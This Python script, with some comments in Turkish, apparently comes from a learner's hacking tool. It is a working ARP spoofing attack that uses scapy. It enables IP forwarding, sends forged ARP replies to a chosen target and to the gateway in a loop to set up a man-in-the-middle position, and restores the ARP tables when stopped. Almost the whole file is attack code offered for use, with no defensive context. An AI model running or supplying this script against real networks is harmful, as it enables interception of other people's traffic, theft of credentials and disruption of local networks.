import optparse
import subprocess
import os
import scapy.all as scapy
import time
import sys


def ip_forwarding_ac():
    print("[*] IP Forwarding is being enabled...")
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[+] IP Forwarding has been successfully ENABLED.")
    except PermissionError:
        print("[-] Error: Access denied! Please run with 'sudo'.")
    except Exception as e:
        print(f"[-] An unexpected error: {e}")


# ✔ Tek parser burada
parse_object = optparse.OptionParser()
parse_object.add_option("-e", "--enable", dest="enable_forward", action="store_true")
parse_object.add_option("-t", "--target", dest="target_ip", help="Enter target ip address")
parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter gateway ip address")
(user_inputs, arguments) = parse_object.parse_args()


# ✔ IP forwarding
if user_inputs.enable_forward:
    ip_forwarding_ac()
else:
    print("[*] The -e parameter was not entered, so the IP forwarding process is skipped.")


# ✔ Kullanıcı giriş kontrolü (parser yeniden oluşturulmadı!)
def get_user_input():
    if not user_inputs.target_ip:
        print("[-] Target IP address is required.")
        sys.exit()

    if not user_inputs.gateway_ip:
        print("[-] Gateway IP address is required.")
        sys.exit()

    return user_inputs


def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] Hata: {ip} adresinden MAC alınamadı. IP doğru mu?")
        return None


def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)

    if target_mac:
        packet = scapy.Ether(dst=target_mac) / scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=poisoned_ip
        )
        scapy.sendp(packet, verbose=False)


def reset_operation(fooled_ip, gateway_ip):
    target_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    if target_mac and gateway_mac:
        packet = scapy.Ether(dst=target_mac) / scapy.ARP(
            op=2,
            pdst=fooled_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac
        )
        scapy.sendp(packet, verbose=False, count=6)


packet_number = 0
user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    print("[*] Initiating an ARP spoofing attack (CTRL+C to exit)...")
    while True:

        arp_poisoning(user_target_ip, user_gateway_ip)

        arp_poisoning(user_gateway_ip, user_target_ip)

        packet_number += 2
        print(f"\r[+] Number of packets sent: {packet_number}", end="")
        time.sleep(3)

except KeyboardInterrupt:
    print("\n[-] The attack was stopped (CTRL+C).")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)
    print("[*] Reset process completed")
